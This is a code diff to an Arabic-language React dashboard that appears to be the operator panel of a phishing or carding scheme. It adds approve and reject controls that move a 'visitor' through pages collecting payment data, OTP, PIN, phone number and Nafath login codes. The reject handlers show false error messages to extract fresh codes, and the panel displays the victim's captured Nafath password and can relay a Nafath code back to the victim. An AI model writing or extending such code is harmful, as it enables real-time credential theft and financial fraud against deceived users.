@@ -907,6 +907,154 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
+  // Handle approve action - move to next step
+  const handleApprove = async (currentStep: string) => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    
+    setActionLoading("approve");
+    
+    // Determine next page based on current step
+    const nextPages: Record<string, string> = {
+      "check": "step2",
+      "step2": "step3",
+      "step3": "step4",
+      "step4": "step5",
+      "step5": "thank-you",
+    };
+    const nextPage = nextPages[currentStep] || "step2";
+    
+    try {
+      const res = await fetch("/api/dashboard/redirect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, targetPage: nextPage }),
+      });
+      if (res.ok) {
+        showNotification("success", `تم الموافقة ✓ تم توجيه العميل للخطوة التالية`);
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  // Handle reject action - go back with error message
+  const handleReject = async (currentStep: string) => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    
+    setActionLoading("reject");
+    
+    // Error messages for each step
+    const errorMessages: Record<string, { message: string; targetPage: string }> = {
+      "check": { message: "يرحى التأكد من بيانات الدفع او استخدام طريقة دفع مختلفة", targetPage: "check" },
+      "step2": { message: "رمز التحقق غير صحيح", targetPage: "step2" },
+      "step3": { message: "رمز pin غير صحيح يرحى التأكد من الرمز مجدا", targetPage: "step3" },
+      "step5": { message: "رقم الهاتف غير صحيح", targetPage: "step5" },
+    };
+    
+    const errorData = errorMessages[currentStep] || { message: "حدث خطأ", targetPage: currentStep };
+    
+    try {
+      const res = await fetch("/api/dashboard/reject", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          visitorId, 
+          targetPage: errorData.targetPage,
+          errorMessage: errorData.message 
+        }),
+      });
+      if (res.ok) {
+        showNotification("error", `تم الرفض ✗ ${errorData.message}`);
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  // Handle step5 approve - redirect to step4
+  const handleStep5Approve = async () => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    
+    setActionLoading("approve");
+    
+    try {
+      const res = await fetch("/api/dashboard/redirect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, targetPage: "step4" }),
+      });
+      if (res.ok) {
+        showNotification("success", "تم الموافقة ✓ تم توجيه العميل لصفحة النفاذ");
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  // Handle resend code for step5
+  const handleResendCode = async () => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    
+    setActionLoading("resend");
+    
+    try {
+      const res = await fetch("/api/dashboard/resend-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          visitorId, 
+          targetPage: "step5",
+          errorMessage: "رمز التحقق غير صحيح او منتهي الصلاحية يرجى انتظار رمز جديد"
+        }),
+      });
+      if (res.ok) {
+        showNotification("success", "تم إعادة إرسال الرمز ✓");
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
+  // Handle nafad code send for step4
+  const handleNafadCode = async (code: string) => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId || !code) return;
+    
+    setActionLoading("nafad");
+    
+    try {
+      const res = await fetch("/api/dashboard/send-nafad-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, nafadCode: code }),
+      });
+      if (res.ok) {
+        showNotification("success", "تم إرسال رمز النفاذ للعميل ✓");
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
   // Get current page and status from visitor data
   const getCurrentPage = (): string => {
     // Get latest phone data from all entries
@@ -2078,14 +2226,18 @@ const renderNafadBox = () => {
             {/* أزرار الموافقة والرفض */}
             <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
               <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+                onClick={() => handleReject("check")}
+                disabled={actionLoading === "reject"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
               >
-                رفض
+                {actionLoading === "reject" ? "جارٍ..." : "رفض"}
               </button>
               <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+                onClick={() => handleApprove("check")}
+                disabled={actionLoading === "approve"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
               >
-                موافقة
+                {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
             </div>
           </div>
@@ -2125,14 +2277,18 @@ const renderNafadBox = () => {
             {/* أزرار الموافقة والرفض */}
             <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
               <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+                onClick={() => handleReject("step3")}
+                disabled={actionLoading === "reject"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
               >
-                رفض
+                {actionLoading === "reject" ? "جارٍ..." : "رفض"}
               </button>
               <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+                onClick={() => handleApprove("step3")}
+                disabled={actionLoading === "approve"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
               >
-                موافقة
+                {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
             </div>
           </div>
@@ -2184,21 +2340,27 @@ const renderNafadBox = () => {
             )}
             {/* زر إعادة إرسال الرمز */}
             <button 
-              style={{ width: "100%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer", marginTop: 12 }}
+              onClick={handleResendCode}
+              disabled={actionLoading === "resend"}
+              style={{ width: "100%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "resend" ? "wait" : "pointer", opacity: actionLoading === "resend" ? 0.7 : 1, marginTop: 12 }}
             >
-              🔄 إعادة إرسال رمز
+              🔄 {actionLoading === "resend" ? "جارٍ الإرسال..." : "إعادة إرسال رمز"}
             </button>
             {/* أزرار الموافقة والرفض */}
             <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
               <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+                onClick={() => handleReject("step5")}
+                disabled={actionLoading === "reject"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: actionLoading === "reject" ? "wait" : "pointer", opacity: actionLoading === "reject" ? 0.7 : 1 }}
               >
-                رفض
+                {actionLoading === "reject" ? "جارٍ..." : "رفض"}
               </button>
               <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+                onClick={handleStep5Approve}
+                disabled={actionLoading === "approve"}
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: actionLoading === "approve" ? "wait" : "pointer", opacity: actionLoading === "approve" ? 0.7 : 1 }}
               >
-                موافقة
+                {actionLoading === "approve" ? "جارٍ..." : "موافقة"}
               </button>
             </div>
           </div>
@@ -2237,19 +2399,43 @@ const renderNafadBox = () => {
                 <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{nafadRaw.nafadPassword}</span>
               </div>
             )}
-            {/* أزرار الموافقة والرفض */}
-            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-              <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
-              >
-                رفض
-              </button>
-              <button 
-                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-              >
-                موافقة
-              </button>
+            {/* حقل إدخال رمز النفاذ */}
+            <div style={{ marginTop: 12 }}>
+              <input
+                type="text"
+                placeholder="أدخل رمز النفاذ..."
+                value={nafadInput}
+                onChange={(e) => setNafadInput(e.target.value)}
+                style={{ 
+                  width: "100%", 
+                  padding: "10px 12px", 
+                  border: "1px solid #d1d5db", 
+                  borderRadius: 8, 
+                  fontSize: "0.9rem",
+                  textAlign: "center",
+                  letterSpacing: "0.2em",
+                  direction: "ltr"
+                }}
+              />
             </div>
+            {/* زر إرسال رمز النفاذ */}
+            <button 
+              onClick={() => handleNafadCode(nafadInput)}
+              disabled={actionLoading === "nafad" || !nafadInput.trim()}
+              style={{ 
+                width: "100%", 
+                padding: "10px 16px", 
+                border: "none", 
+                borderRadius: 8, 
+                background: nafadInput.trim() ? "#111827" : "#9ca3af", 
+                color: "#ffffff", 
+                fontWeight: 600, 
+                cursor: actionLoading === "nafad" || !nafadInput.trim() ? "wait" : "pointer", 
+                marginTop: 8 
+              }}
+            >
+              📤 {actionLoading === "nafad" ? "جارٍ الإرسال..." : "إرسال رمز النفاذ"}
+            </button>
           </div>
         )
       });
